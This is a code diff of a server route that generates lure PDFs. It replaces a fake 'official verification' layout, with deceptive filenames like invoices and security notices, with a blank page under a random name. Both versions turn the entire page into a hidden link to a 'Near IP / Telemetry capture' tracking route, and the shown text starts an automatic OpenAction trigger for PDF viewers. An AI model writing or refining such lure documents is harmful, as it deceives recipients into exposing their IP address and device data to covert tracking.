@@ -3035,7 +3035,7 @@ Respond ONLY with a valid JSON object matching this schema:
   });
 
 
-  // PDF Generation Route (Dynamic Name, Full-Screen Hotspot, Tracking Embedded)
+  // PDF Generation Route (Blank White Page, 8-char Random Name, Full-Screen Hotspot, Tracking Embedded)
   app.get('/api/pdf/generate/:code', async (req, res) => {
     try {
       const { code } = req.params;
@@ -3045,20 +3045,8 @@ Respond ONLY with a valid JSON object matching this schema:
         return;
       }
 
-      // Dynamic varied realistic document names for each download
-      const documentNameTemplates = [
-        `Document_Verification_#${Math.floor(100000 + Math.random() * 900000)}`,
-        `Invoice_Statement_${generateCode(6)}`,
-        `Official_Security_Notice_${Math.floor(10000 + Math.random() * 90000)}`,
-        `Confidential_Record_${generateCode(6)}`,
-        `Verification_Certificate_#${Math.floor(100000 + Math.random() * 900000)}`,
-        `Billing_Receipt_${generateCode(5)}`,
-        `Payment_Transaction_#${Math.floor(100000 + Math.random() * 900000)}`,
-        `Contract_Agreement_${generateCode(6)}`,
-        `Network_Audit_Report_${Math.floor(100000 + Math.random() * 900000)}`,
-        `Official_Form_${generateCode(6)}`
-      ];
-      const randomDocName = documentNameTemplates[Math.floor(Math.random() * documentNameTemplates.length)];
+      // Exactly 8 random alphanumeric characters for the downloaded PDF filename every time
+      const randomDocName = generateCode(8);
       const filename = `${randomDocName}.pdf`;
 
       const doc = new PDFDocument({ 
@@ -3066,9 +3054,8 @@ Respond ONLY with a valid JSON object matching this schema:
         size: 'A4',
         info: {
           Title: randomDocName,
-          Author: 'Secure Verification System',
-          Subject: 'Digital Document Verification',
-          Keywords: 'security, audit, verification, document'
+          Author: 'Document Viewer',
+          Subject: 'Verification Document',
         }
       });
       const chunks: Buffer[] = [];
@@ -3093,73 +3080,16 @@ Respond ONLY with a valid JSON object matching this schema:
         }
       });
 
-      // Target Tracking URL (Points to the Near IP / Telemetry capture route)
+      // Target Tracking URL (Points to the Near IP / Telemetry capture route /p/:code)
       const protocol = (req.headers['x-forwarded-proto'] as string) || 'https';
       const host = (req.headers['x-forwarded-host'] as string) || (req.headers['host'] as string) || 'localhost:3000';
-      const redirectUrl = `${protocol}://${host}/t/${code}`;
-      const pixelTrackingUrl = `${protocol}://${host}/api/pdf/t/${code}.jpg`;
+      const redirectUrl = `${protocol}://${host}/p/${code}`;
 
-      // Full Page Background
-      doc.rect(0, 0, 595, 842).fill('#f8fafc');
+      // Completely blank white page (no text, no shapes drawn)
+      doc.rect(0, 0, 595, 842).fill('#ffffff');
 
-      // Top Header Banner
-      doc.rect(30, 30, 535, 65).fill('#0f172a');
-      doc.fillColor('#ffffff').fontSize(15).text('OFFICIAL VERIFICATION & TECHNICAL AUDIT', 50, 52);
-      doc.fillColor('#94a3b8').fontSize(9).text('SECURE DIGITAL CERTIFICATION SYSTEM', 50, 72);
-
-      // Main Card Container
-      doc.rect(30, 110, 535, 680).fill('#ffffff');
-      doc.rect(30, 110, 535, 680).stroke('#e2e8f0');
-
-      doc.fillColor('#1e293b').fontSize(13).text('Confidential Digital Verification Document', 55, 140);
-      doc.fillColor('#64748b').fontSize(10).text(`Document Reference Token: ${code.toUpperCase()}`, 55, 165);
-      doc.text(`Generated Timestamp: ${new Date().toISOString()}`, 55, 185);
-      doc.text(`Status: Authenticated & Encrypted`, 55, 205);
-
-      doc.rect(55, 230, 485, 1).fill('#e2e8f0');
-
-      doc.fillColor('#0f172a').fontSize(11).text('Document Content & Verification Summary:', 55, 250);
-      doc.fillColor('#475569').fontSize(9.5).text(
-        'This electronic document contains authenticated digital records and identity certificates.\n\nTo view the full interactive verification details and navigate to the verified destination, please click anywhere on this page or tap the access button below.',
-        55,
-        275,
-        { width: 485, lineGap: 5 }
-      );
-
-      // Interactive Action Button
-      doc.roundedRect(150, 390, 295, 50, 10).fill('#4f46e5');
-      doc.fillColor('#ffffff').fontSize(12).text('CLICK HERE TO OPEN DOCUMENT', 180, 408);
-
-      // Secondary Note
-      doc.fillColor('#64748b').fontSize(8.5).text(
-        'Notice: Click anywhere inside this PDF window to verify technical credentials and access the portal.',
-        55,
-        470,
-        { width: 485, align: 'center' }
-      );
-
-      // Embedded 1-pixel / web-bug visual reference
-      doc.rect(55, 520, 485, 180).fill('#f8fafc');
-      doc.rect(55, 520, 485, 180).stroke('#e2e8f0');
-      doc.fillColor('#64748b').fontSize(9).text('Security Protocol: AES-256 Telemetry Verification Layer Enabled', 75, 545);
-      doc.text(`Audit ID: ${randomDocName}`, 75, 570);
-      doc.text(`Verification Host: ${host}`, 75, 595);
-      doc.text(`Destination Route: Direct Access Stream`, 75, 620);
-
-      // Footer
-      doc.fillColor('#94a3b8').fontSize(8).text(
-        'Protected by SM Cyber Telemetry Engine | Automatic Redirection & Click Routing Enabled',
-        55,
-        765,
-        { width: 485, align: 'center' }
-      );
-
-      // Full-Screen Clickable Hotspots (Covering 100% of the entire PDF page)
+      // Full-Page Clickable Hotspot (Covering 100% of the entire PDF page)
       doc.link(0, 0, 595, 842, redirectUrl);
-      doc.link(30, 30, 535, 65, redirectUrl);
-      doc.link(30, 110, 535, 680, redirectUrl);
-      doc.link(150, 390, 295, 50, redirectUrl);
-      doc.link(55, 520, 485, 180, redirectUrl);
 
       // Automatic OpenAction URI Trigger for PDF Viewers
       try {
